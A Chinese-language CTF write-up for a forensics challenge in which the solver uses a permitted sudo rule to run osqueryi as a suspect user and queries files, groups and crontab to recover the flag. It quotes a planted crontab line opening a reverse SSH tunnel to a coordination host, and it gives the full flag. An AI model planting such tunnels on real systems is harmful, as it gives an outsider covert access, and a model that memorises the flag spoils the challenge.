# Interrogation

## 题目简述

题目提供一个可登录的 Linux 主机，要求从嫌疑人 Moriarty 的系统痕迹中找出所用工具、所属组和协调服务器。普通用户 `ctf` 不能直接读取全部信息，但 sudoers 明确允许其以 Moriarty 身份运行 `osqueryi`，可以通过 osquery 的虚拟表查询文件、组与 crontab。

## 解题过程

### 确认被授权的 osquery 入口

登录后先查看 sudo 权限：

```bash
sudo -l
```

关键输出为：

```text
User ctf may run the following commands:
    (Moriarty) /usr/bin/osqueryi
```

以目标用户身份启动交互式查询：

```bash
sudo -u Moriarty /usr/bin/osqueryi
```

### 关联文件、用户组和定时任务

先列出 `/usr/bin` 中的文件元数据，关注属于 Moriarty 的异常条目：

```sql
SELECT path, filename, uid, gid
FROM file
WHERE directory = '/usr/bin';
```

异常工具名为：

```text
Cr1m3m4st3rm1ndK1t
```

再查看组表，将该文件的 gid 或 Moriarty 的成员关系映射到组名：

```text
.all groups
```

得到组名 `APT221`。最后查看系统定时任务：

```text
.all crontab
```

其中的关键命令是：

```bash
ssh -R '*:1337:localhost:1337' Moriarty@Th3Sh3rl0ck3d
```

`@` 后的主机名就是协调服务器 `Th3Sh3rl0ck3d`。按题目规定的顺序组合：

```text
shellmates{Cr1m3m4st3rm1ndK1t_APT221_Th3Sh3rl0ck3d}
```

仓库的初始化脚本也印证了这条证据链：它创建同名 `/usr/bin` 文件，将所有者设为 `Moriarty:APT221`，并把上述反向 SSH 命令写入 `/etc/crontab`。

## 方法总结

- 核心技巧：利用受限 sudo 授权进入 osquery，从文件、组和 crontab 三类系统表关联主机证据。
- 识别信号：无法直接切换用户，但 `sudo -l` 允许以目标身份运行强大的查询工具时，应评估该工具能读取哪些系统状态。
- 复用要点：flag 各字段应由相互独立的证据表确认，并通过部署脚本或底层文件交叉验证，避免只凭异常名称猜测。
